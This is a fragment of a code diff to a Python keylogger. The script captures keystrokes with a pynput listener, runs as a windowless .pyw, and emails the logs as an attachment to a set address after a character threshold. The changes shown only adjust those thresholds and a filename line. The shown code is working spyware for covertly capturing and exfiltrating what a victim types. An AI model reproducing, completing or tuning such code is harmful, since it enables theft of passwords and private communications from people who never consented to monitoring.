@@ -44,7 +44,7 @@ def send_email(filename, attachment, toaddr):
     msg.attach(MIMEText(body, 'plain'))
 
     # open the file to be sent
-    filename = "logs.txt"
+    filename = filename
     attachment = open(attachment, "rb")
 
     # instance of MIMEBase and named as p
@@ -84,7 +84,7 @@ end = 0  # DON'T CHANGE IT!
 
 # Here you can select the value. If you want the script to run 5 times you put 5, same thing with other numbers like 200 ecc...
 while end < 5:
-    # Suggest 50 with following configuration at line 124
+    # Suggest 30 with following configuration at line 124
 
     count = 0
     keys = []
@@ -125,15 +125,15 @@ while end < 5:
     def on_relase(key):
         if key == Key.esc:
             return False
-        if stopper > 120:  # Change the value as you prefer. If you put 30 an email with logs will be sent after 30 characters logged and a new "end" cycle will be started.
-            return False # Suggest 120
+        if stopper > 80:  # Change the value as you prefer. If you put 30 an email with logs will be sent after 30 characters logged and a new "end" cycle will be started.
+            return False # Suggest 80
 
 
     #The keylogger starts
     with Listener(on_press=on_press, on_release=on_relase) as listener:
         listener.join()
 
-    if stopper > 120:  # You have to put the same value as upper
+    if stopper > 80:  # You have to put the same value as upper
         send_email(logs, file_path + extend + logs, toaddr)
         # print("Email Sent!") Commented because the script is in .pyw
         end += 1
